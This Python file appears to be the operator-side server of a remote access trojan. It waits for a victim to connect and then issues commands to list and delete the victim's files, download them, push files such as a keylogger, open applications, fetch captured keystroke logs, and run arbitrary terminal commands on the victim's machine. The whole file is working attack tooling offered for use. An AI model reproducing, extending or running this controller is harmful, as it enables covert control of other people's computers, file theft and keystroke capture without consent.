import socket
import os
sock=socket.socket() #create new socket
host=socket.gethostname() #string containing hostname...gethostbyname--->return ipv4 address
port=348
date="date"
os.chdir("/root/Documents")
print(os.system(date))
sock.bind((host,port)) #tie ip+port
print("***************************************")
print("server running at "+host)
print("***************************************")
print("waiting for incoming connections ......")
sock.listen(1)#listen 4 connections (1--no of max queued connections)
conn,addr=sock.accept() #accept connections
print("***************************************")
print(addr[0]+" has connected to the server successfully")
print("Available commands are:")
print("1. view cwd\n2. list files in custom directory\n3. Download file\n"
      "4. Delete file\n5. Share\n6. Open app\n7. "
      "keylogger file\n8. run python code on terminal\n")
while 1:
    command=input("command >>")
    if command=="view cwd":
        conn.send(command.encode())
        print("*******************************")
        print("command sent wait for execution")
        print("*******************************")
        print("command successfully executed")
        file=conn.recv(5000)
        file=file.decode()
        print("current working directory: "+file)
    elif command=="Custom":
        conn.send(command.encode())
        custom=input("dir: ")
        conn.send(custom.encode())
        print("command sent wait for execution")
        print("*******************************")
        print("command successfully executed")
        file=conn.recv(5000)
        file=file.decode()
        print("the following are files in the folder "+file)
    elif command=="Download":
        conn.send(command.encode())
        path=input("Enter path of file to download")
        conn.send(path.encode())
        file=conn.recv(10000)
        filename=input("Rename the file")
        new_file=open(filename,"wb")
        new_file.write(file)
        new_file.close()
        print(filename+" successfuly downloaded")
    elif command=="Delete":
        conn.send(command.encode())
        path=input("Enter path for the file to delete")
        conn.send(path.encode())
        print("********************************")
        print("file deleted successfully")
        print("********************************")
    elif command=="Share":
        conn.send(command.encode())
        filepath=input("Enter path for file to share")
        data=open(filepath,"rb")
        filedata=data.read(10000)
        conn.send(filepath.encode())
        print()
        conn.send(filedata)
        print("keylogger successfuly sent")
        print()
    elif command=="Open":
        conn.send(command.encode())
        app=input("Enter application you wish to open")
        conn.send(app.encode())
        print("*******************************")
        print("Command successfully sent")
        print("*******************************")
    elif command=="keylogger":
        conn.send(command.encode())
        keylogfile=conn.recv(1000)
        os.chdir("/root/Desktop")
        keylog=open("keylog","wb")
        keylog.write(keylogfile)
        keylog.close()
        print("Keylog successfully downloaded")
    elif command=="terminal":
        os.chdir("/root/Downloads")
        conn.send(command.encode())
        while True:
            comm = input("Enter command to run on terminal")
            conn.send(comm.encode())
            print("command sent successfully")
    else:
        print("*******************************")
        print("execution failed")
        print("*******************************")
        break
